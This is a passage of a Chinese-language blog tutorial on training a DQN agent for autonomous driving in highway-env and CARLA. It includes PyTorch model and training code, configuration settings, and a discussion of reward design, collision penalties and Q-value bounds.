class="string">&quot;observation&quot;</span>: </span><br><span class="line">         &#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;Kinematics&quot;</span>,</span><br><span class="line">        <span class="comment">#选取5辆车进行观察（包括ego vehicle）</span></span><br><span class="line">        <span class="string">&quot;vehicles_count&quot;</span>: <span class="number">5</span>,  </span><br><span class="line">        <span class="comment">#共7个特征</span></span><br><span class="line">        <span class="string">&quot;features&quot;</span>: [<span class="string">&quot;presence&quot;</span>, <span class="string">&quot;x&quot;</span>, <span class="string">&quot;y&quot;</span>, <span class="string">&quot;vx&quot;</span>, <span class="string">&quot;vy&quot;</span>, <span class="string">&quot;cos_h&quot;</span>, <span class="string">&quot;sin_h&quot;</span>], </span><br><span class="line">        <span class="string">&quot;features_range&quot;</span>: </span><br><span class="line">            &#123;</span><br><span class="line">            <span class="string">&quot;x&quot;</span>: [-<span class="number">100</span>, <span class="number">100</span>],</span><br><span class="line">            <span class="string">&quot;y&quot;</span>: [-<span class="number">100</span>, <span class="number">100</span>],</span><br><span class="line">            <span class="string">&quot;vx&quot;</span>: [-<span class="number">20</span>, <span class="number">20</span>],</span><br><span class="line">            <span class="string">&quot;vy&quot;</span>: [-<span class="number">20</span>, <span class="number">20</span>]</span><br><span class="line">            &#125;,</span><br><span class="line">        <span class="string">&quot;absolute&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&quot;order&quot;</span>: <span class="string">&quot;sorted&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">    <span class="string">&quot;simulation_frequency&quot;</span>: <span class="number">8</span>,  <span class="comment"># [Hz]</span></span><br><span class="line">    <span class="string">&quot;policy_frequency&quot;</span>: <span class="number">2</span>,  <span class="comment"># [Hz]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Grayscale-Image"><a href="#Grayscale-Image" class="headerlink" title="Grayscale Image"></a>Grayscale Image</h4><p>生成一张W*H的灰度图像，W代表图像宽度，H代表图像高度</p><h4 id="Occupancy-grid"><a href="#Occupancy-grid" class="headerlink" title="Occupancy grid"></a>Occupancy grid</h4><p>生成一个W<em>H</em>F的三维矩阵，用W*H的表格表示ego vehicle周围的车辆情况，每个格子包含F个特征。</p><p>(2) action</p><p>highway-env包中的action分为连续和离散两种。连续型action可以直接定义throttle和steering angle的值，离散型包含5个meta actions：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ACTIONS_ALL = &#123;</span><br><span class="line">        <span class="number">0</span>: <span class="string">&#x27;LANE_LEFT&#x27;</span>,</span><br><span class="line">        <span class="number">1</span>: <span class="string">&#x27;IDLE&#x27;</span>,</span><br><span class="line">        <span class="number">2</span>: <span class="string">&#x27;LANE_RIGHT&#x27;</span>,</span><br><span class="line">        <span class="number">3</span>: <span class="string">&#x27;FASTER&#x27;</span>,</span><br><span class="line">        <span class="number">4</span>: <span class="string">&#x27;SLOWER&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>(3) reward</p><p>highway-env包中除了泊车场景外都采用同一个reward function：</p><p><img src="/.io//image-20220719182922431.png" alt="image-20220719182922431"></p><p>这个function只能在其源码中更改，在外层只能调整权重。</p><h4 id="4-2-4-搭建模型"><a href="#4-2-4-搭建模型" class="headerlink" title="4.2.4 搭建模型"></a>4.2.4 搭建模型</h4><p>这里采用第一种state表示方式——Kinematics进行示范。</p><p>由于state数据量较小（5辆车*7个特征），可以不考虑使用CNN，直接把二维数据的size[5,7]转成[1,35]即可，模型的输入就是35，输出是离散action数量，共5个。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">from</span> torch.autograd <span class="keyword">import</span> Variable</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">import</span> torch.optim <span class="keyword">as</span> optim</span><br><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> T</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> FloatTensor, LongTensor, ByteTensor</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">device = torch.device(<span class="string">&#x27;cuda&#x27;</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">&#x27;cpu&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Tensor = FloatTensor</span><br><span class="line"></span><br><span class="line">EPSILON = <span class="number">0</span>  <span class="comment"># epsilon used for epsilon greedy approach</span></span><br><span class="line">GAMMA = <span class="number">0.9</span></span><br><span class="line">TARGET_NETWORK_REPLACE_FREQ = <span class="number">40</span>  <span class="comment"># How frequently target netowrk updates</span></span><br><span class="line">MEMORY_CAPACITY = <span class="number">100</span></span><br><span class="line">BATCH_SIZE = <span class="number">80</span></span><br><span class="line">LR = <span class="number">0.01</span>  <span class="comment"># learning rate</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DQNNet</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(DQNNet, self).__init__()</span><br><span class="line">        self.linear1 = nn.Linear(<span class="number">35</span>, <span class="number">256</span>).to(device)</span><br><span class="line">        self.linear2 = nn.Linear(<span class="number">256</span>, <span class="number">256</span>).to(device)</span><br><span class="line">        self.linear3 = nn.Linear(<span class="number">256</span>, <span class="number">5</span>).to(device)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, s</span>):</span><br><span class="line">        s = torch.FloatTensor(s)</span><br><span class="line">        s = s.view(s.size(<span class="number">0</span>), <span class="number">1</span>, <span class="number">35</span>)</span><br><span class="line">        s = s.to(device)</span><br><span class="line">        s = self.linear1(s)</span><br><span class="line">        s = self.linear2(s)</span><br><span class="line">        s = self.linear3(s)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DQN</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.net, self.target_net = DQNNet(), DQNNet()</span><br><span class="line">        self.learn_step_counter = <span class="number">0</span></span><br><span class="line">        self.memory = []</span><br><span class="line">        self.position = <span class="number">0</span></span><br><span class="line">        self.capacity = MEMORY_CAPACITY</span><br><span class="line">        self.optimizer = torch.optim.Adam(self.net.parameters(), lr=LR)</span><br><span class="line">        self.loss_func = nn.MSELoss().cuda()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">choose_action</span>(<span class="params">self, s, e</span>):</span><br><span class="line">        x = np.expand_dims(s, axis=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> np.random.uniform() &lt; <span class="number">1</span> - e:</span><br><span class="line">            actions_value = self.net.forward(x)</span><br><span class="line">            action = torch.<span class="built_in">max</span>(actions_value, -<span class="number">1</span>)[<span class="number">1</span>].data.cpu().numpy()</span><br><span class="line">            action = action.<span class="built_in">max</span>()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            action = np.random.randint(<span class="number">0</span>, <span class="number">5</span>)</span><br><span class="line">        <span class="keyword">return</span> action</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">push_memory</span>(<span class="params">self, s, a, r, s_</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(self.memory) &lt; self.capacity:</span><br><span class="line">            self.memory.append(<span class="literal">None</span>)</span><br><span class="line">        self.memory[self.position] = Transition(torch.unsqueeze(torch.FloatTensor(s), <span class="number">0</span>),</span><br><span class="line">                                                torch.unsqueeze(torch.FloatTensor(s_), <span class="number">0</span>),\</span><br><span class="line">                                                torch.from_numpy(np.array([a])),</span><br><span class="line">                                                torch.from_numpy(np.array([r], dtype=<span class="string">&#x27;float32&#x27;</span>)))  <span class="comment">#</span></span><br><span class="line">        self.position = (self.position + <span class="number">1</span>) % self.capacity</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_sample</span>(<span class="params">self, batch_size</span>):</span><br><span class="line">        sample = random.sample(self.memory, batch_size)</span><br><span class="line">        <span class="keyword">return</span> sample</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">learn</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.learn_step_counter % TARGET_NETWORK_REPLACE_FREQ == <span class="number">0</span>:</span><br><span class="line">            self.target_net.load_state_dict(self.net.state_dict())</span><br><span class="line">        self.learn_step_counter += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        transitions = self.get_sample(BATCH_SIZE)</span><br><span class="line">        batch = Transition(*<span class="built_in">zip</span>(*transitions))</span><br><span class="line"></span><br><span class="line">        b_s = Variable(torch.cat(batch.state))</span><br><span class="line">        b_s_ = Variable(torch.cat(batch.next_state))</span><br><span class="line">        b_a = Variable(torch.cat(batch.action)).to(device)</span><br><span class="line">        b_r = Variable(torch.cat(batch.reward)).to(device)</span><br><span class="line"></span><br><span class="line">        q_eval = self.net.forward(b_s).squeeze(<span class="number">1</span>).gather(<span class="number">1</span>, b_a.unsqueeze(<span class="number">1</span>).to(torch.int64))</span><br><span class="line">        q_next = self.target_net.forward(b_s_).detach().to(device)  <span class="comment">#</span></span><br><span class="line">        q_target = b_r + GAMMA * q_next.squeeze(<span class="number">1</span>).<span class="built_in">max</span>(<span class="number">1</span>)[<span class="number">0</span>].view(BATCH_SIZE, <span class="number">1</span>).t().to(device)</span><br><span class="line">        loss = self.loss_func(q_eval, q_target.t()).to(device)</span><br><span class="line">        self.optimizer.zero_grad()  <span class="comment"># reset the gradient to zero</span></span><br><span class="line">        loss.backward()</span><br><span class="line">        self.optimizer.step()  <span class="comment"># execute back propagation for one step</span></span><br><span class="line">        <span class="keyword">return</span> loss</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Transition = namedtuple(<span class="string">&#x27;Transition&#x27;</span>, (<span class="string">&#x27;state&#x27;</span>, <span class="string">&#x27;next_state&#x27;</span>, <span class="string">&#x27;action&#x27;</span>, <span class="string">&#x27;reward&#x27;</span>))</span><br></pre></td></tr></table></figure><ul><li>模型结构</li></ul><p>这里对原作者的网络结构进行了更改。在example里设置的模型只有一个隐藏层，neuron数量和输入层相同，即模型结构为[35,35,5]，把隐藏层的数量和neuron数都增大，这里设为了[35,256,256,5]，模型效果有所提升。</p><ul><li>reward定义</li></ul><p>highway-env环境内部对于reward的定义比较固定，不支持自由更改，如果想高度自定义reward，建议在环境外部自己写function，不要使用环境反馈的reward。</p><p>在highway-env的官方文档中又有说明，奖励必须是有界的，所以无论如何在config里设置奖励或惩罚的数值，都会被归一化，使其介于[0,1]。如果因为认为模型碰撞发生率过高，为了让它更注重避障，在config里把碰撞的惩罚设置成一个很小的负数，环境对碰撞的奖励输出还是0，但是加速奖励因为归一化的下界变化变得更接近1了，这样相当于没有减小碰撞奖励，反而增大了速度奖励，适得其反，模型变得更激进了。碰撞惩罚越大，发生碰撞的概率越高。</p><ul><li>网络价值分析</li></ul><p>假设当前DQN已经训练到最优，即对每个局面下的每个动作价值输出都是准确的，并且策略会在每个状态下做出最优选择。由于env定义的reward介于[0,1]，可以使用等比数列求和公式计算出最理想情况下每个动作值的上界。<br>$$<br>Qmax &#x3D; 1+γ∗1+γ∗(γ∗1)+γ∗(γ∗(γ∗1))+…&#x3D;1&#x2F;(1-γ)<br>$$<br>如果期望的收益是有限的，那么γ一定小于1，如果设为0.8，模型能输出的最大Q值是5，如果设为0.9，模型能输出的最大Q值是10，以此类推。如果模型输出的某个动作Q值超过了这个数，就可以认为模型没有正确学习到价值，学习过程有bug，需要检查代码。</p><h4 id="4-2-5-开始训练"><a href="#4-2-5-开始训练" class="headerlink" title="4.2.5 开始训练"></a>4.2.5 开始训练</h4><p>初始化环境，加入DQN的类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gym</span><br><span class="line"><span class="keyword">import</span> highway_env</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> DQNnet <span class="keyword">import</span> DQN</span><br><span class="line">config = \</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="string">&quot;observation&quot;</span>: </span><br><span class="line">         &#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;Kinematics&quot;</span>,</span><br><span class="line">        <span class="string">&quot;vehicles_count&quot;</span>: <span class="number">5</span>,</span><br><span class="line">        <span class="string">&quot;features&quot;</span>: [<span class="string">&quot;presence&quot;</span>, <span class="string">&quot;x&quot;</span>, <span class="string">&quot;y&quot;</span>, <span class="string">&quot;vx&quot;</span>, <span class="string">&quot;vy&quot;</span>, <span class="string">&quot;cos_h&quot;</span>, <span class="string">&quot;sin_h&quot;</span>],</span><br><span class="line">        <span class="string">&quot;features_range&quot;</span>: </span><br><span class="line">            &#123;</span><br><span class="line">            <span class="string">&quot;x&quot;</span>: [-<span class="number">100</span>, <span class="number">100</span>],</span><br><span class="line">            <span class="string">&quot;y&quot;</span>: [-<span class="number">100</span>, <span class="number">100</span>],</span><br><span class="line">            <span class="string">&quot;vx&quot;</span>: [-<span class="number">20</span>, <span class="number">20</span>],</span><br><span class="line">            <span class="string">&quot;vy&quot;</span>: [-<span class="number">20</span>, <span class="number">20</span>]</span><br><span class="line">            &#125;,</span><br><span class="line">        <span class="string">&quot;absolute&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&quot;order&quot;</span>: <span class="string">&quot;sorted&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">    <span class="string">&quot;simulation_frequency&quot;</span>: <span class="number">8</span>,  <span class="comment"># [Hz]</span></span><br><span class="line">    <span class="string">&quot;policy_frequency&quot;</span>: <span class="number">2</span>,  <span class="comment"># [Hz]</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">env = gym.make(<span class="string">&quot;highway-v0&quot;</span>)</span><br><span class="line">env.configure(config)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>训练：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gym</span><br><span class="line"><span class="keyword">import</span> highway_env</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> DQNnet <span class="keyword">import</span> DQN</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> torch.utils.tensorboard <span class="keyword">import</span> SummaryWriter</span><br><span class="line"></span><br><span class="line">writer = SummaryWriter(<span class="string">&#x27;./log&#x27;</span>)</span><br><span class="line"></span><br><span class="line">config = \</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;observation&quot;</span>:</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;Kinematics&quot;</span>,</span><br><span class="line">                <span class="string">&quot;vehicles_count&quot;</span>: <span class="number">5</span>,</span><br><span class="line">                <span class="string">&quot;features&quot;</span>: [<span class="string">&quot;presence&quot;</span>, <span class="string">&quot;x&quot;</span>, <span class="string">&quot;y&quot;</span>, <span class="string">&quot;vx&quot;</span>, <span class="string">&quot;vy&quot;</span>, <span class="string">&quot;cos_h&quot;</span>, <span class="string">&quot;sin_h&quot;</span>],</span><br><span class="line">                <span class="string">&quot;features_range&quot;</span>:</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="string">&quot;x&quot;</span>: [-<span class="number">100</span>, <span class="number">100</span>],</span><br><span class="line">                        <span class="string">&quot;y&quot;</span>: [-<span class="number">100</span>, <span class="number">100</span>],</span><br><span class="line">                        <span class="string">&quot;vx&quot;</span>: [-<span class="number">20</span>, <span class="number">20</span>],</span><br><span class="line">                        <span class="string">&quot;vy&quot;</span>: [-<span class="number">20</span>, <span class="number">20</span>]</span><br><span class="line">                    &#125;,</span><br><span class="line">                <span class="string">&quot;absolute&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                <span class="string">&quot;order&quot;</span>: <span class="string">&quot;sorted&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">        <span class="string">&quot;simulation_frequency&quot;</span>: <span class="number">8</span>,  <span class="comment"># [Hz]</span></span><br><span class="line">        <span class="string">&quot;policy_frequency&quot;</span>: <span class="number">2</span>,  <span class="comment"># [Hz]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">env = gym.make(<span class="string">&quot;highway-v0&quot;</span>)</span><br><span class="line">env.configure(config)</span><br><span class="line"></span><br><span class="line">dqn = DQN()</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">reward = []</span><br><span class="line">avg_reward = <span class="number">0</span></span><br><span class="line">all_reward = []</span><br><span class="line"></span><br><span class="line">time_ = []</span><br><span class="line">all_time = []</span><br><span class="line"></span><br><span class="line">collision_his = []</span><br><span class="line">all_collision = []</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    done = <span class="literal">False</span></span><br><span class="line">    start_time = time.time()</span><br><span class="line">    s = env.reset()</span><br><span class="line">    s = s[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># while True:</span></span><br><span class="line">    <span class="comment">#     done = False</span></span><br><span class="line">    <span class="comment"># start_time = time.time()</span></span><br><span class="line">    <span class="comment"># s = env.reset()</span></span><br><span class="line">    <span class="comment"># s = s[0]</span></span><br><span class="line">    <span class="comment"># while not done:</span></span><br><span class="line">    <span class="comment">#     e = np.exp(-count / 300)  # 随机选择action的概率，随着训练次数增多逐渐降低</span></span><br><span class="line">    <span class="comment"># a = dqn.choose_action(s, e)</span></span><br><span class="line">    <span class="comment"># s_, r, done, truncated, info = env.step(a)</span></span><br><span class="line">    <span class="comment"># env.render()</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> done:</span><br><span class="line">        e = np.exp(-count / <span class="number">300</span>)  <span class="comment"># 随机选择action的概率，随着训练次数增多逐渐降低</span></span><br><span class="line">        a = dqn.choose_action(s, e)</span><br><span class="line">        s_, r, done,truncated, info = env.step(a)</span><br><span class="line">        env.render()</span><br><span class="line">        dqn.push_memory(s, a, r, s_)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((dqn.position != <span class="number">0</span>) &amp; (dqn.position % <span class="number">99</span> == <span class="number">0</span>)):</span><br><span class="line">            loss_ = dqn.learn()</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;epoch:&#x27;</span>, count)</span><br><span class="line">            avg_reward = np.mean(reward)</span><br><span class="line">            avg_time = np.mean(time_)</span><br><span class="line">            collision_rate = np.mean(collision_his)</span><br><span class="line"></span><br><span class="line">            all_reward.append(avg_reward)</span><br><span class="line">            all_time.append(avg_time)</span><br><span class="line">            all_collision.append(collision_rate)</span><br><span class="line"></span><br><span class="line">            writer.add_scalar(<span class="string">&#x27;result/reward&#x27;</span>, np.asarray(avg_reward), count)</span><br><span class="line">            writer.add_scalar(<span class="string">&#x27;result/time&#x27;</span>, np.asarray(avg_time), count)</span><br><span class="line">            writer.add_scalar(<span class="string">&#x27;result/collision&#x27;</span>, np.asarray(collision_rate), count)</span><br><span class="line"></span><br><span class="line">            reward = []</span><br><span class="line">            time_ = []</span><br><span class="line">            collision_his = []</span><br><span class="line"></span><br><span class="line">        s = s_</span><br><span class="line">        reward.append(r)</span><br><span class="line"></span><br><span class="line">    end_time = time.time()</span><br><span class="line">    episode_time = end_time - start_time</span><br><span class="line">    time_.append(episode_time)</span><br><span class="line"></span><br><span class="line">    is_collision = <span class="number">1</span> <span class="keyword">if</span> info[<span class="string">&#x27;crashed&#x27;</span>] == <span class="literal">True</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    collision_his.append(is_collision)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/.io//image-20220719184300915.png" alt="image-20220719184300915"></p><p>小车进行了规避的动作，以避免发生碰撞。</p><p>在终端运行tensorboard –logdir&#x3D;.&#x2F;log可以查看可视化界面。</p><p><img src="/.io//image-20220719214959967.png" alt="image-20220719214959967"></p><p><img src="/.io//image-20220719215011582.png" alt="image-20220719215011582"></p><p>可以看出平均碰撞发生率会随训练次数增多逐渐降低，每个epoch持续的时间会逐渐延长（如果发生碰撞epoch会立刻结束）</p><p>看到原作者的效果对比，可以看出模型更快达到高reward，高time，碰撞率也下降得更快。（原作者中是每40次记录一次，相当于八百次）。</p><p><img src="/.io//image-20220719215225768.png" alt="image-20220719215225768"></p><p>没有加上模型保存代码。这个模型也不是非常好，大家看着玩就行，调参的时间成本非常高，我没继续调下去了。</p><h3 id="4-3-使用CARLA模拟器实现DQN自动驾驶"><a href="#4-3-使用CARLA模拟器实现DQN自动驾驶" class="headerlink" title="4.3  使用CARLA模拟器实现DQN自动驾驶"></a>4.3  使用CARLA模拟器实现DQN自动驾驶</h3><p>由于图像数据的结构复杂，数据量大，考虑到用没有超强算力的电脑运行程序的时候，为了简化模型结构，对数据进行压缩，摄像头传来的图像先设置为80*60。</p><p>为了让模型能学到正确的参数，需要对智能体的action和reward进行定义，汽车控制的主要3个参数可以量化成油门力度([0,1])，刹车力度([0,1])，方向盘角度([-1,1])，是否倒档(True&#x2F;False)。但是根据一般的开车习惯，这些变量并不是相互独立的，比如油门和刹车一般不会同时踩下（除了漂移），定义DQN的输出时，为了计算对应action的Q值，先对action量化为几个类别：</p><p>1.直行加速：throttle&#x3D;1, brake&#x3D;0, steer&#x3D;0, reverse&#x3D;False<br>2.左转（满舵）：throttle&#x3D;0.5, brake&#x3D;0, steer&#x3D;-1, reverse&#x3D;False<br>3.右转（满舵）：throttle&#x3D;0.5, brake&#x3D;0, steer&#x3D;1, reverse&#x3D;False<br>4.直行减速：throttle&#x3D;0, brake&#x3D;0.5, steer&#x3D;0, reverse&#x3D;False<br>5.直行倒车：throttle&#x3D;1, brake&#x3D;0, steer&#x3D;0, reverse&#x3D;True</p><p>之后需要定义汽车行驶的reward，我们可以随机在地图上另选一点，将其坐标作为驾驶的终点，每一帧刷新时，如下定义reward：</p><p>1.若发生碰撞，reward&#x3D;-200<br>2.若下一帧和当前帧相比，汽车到终点的距离更近，reward&#x3D;1<br>3.若下一帧和当前帧相比，汽车到终点的距离更远，reward&#x3D;-1</p><p>定义好之后我们需要将上述功能封装进step()函数并加入环境class，修改后环境class代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 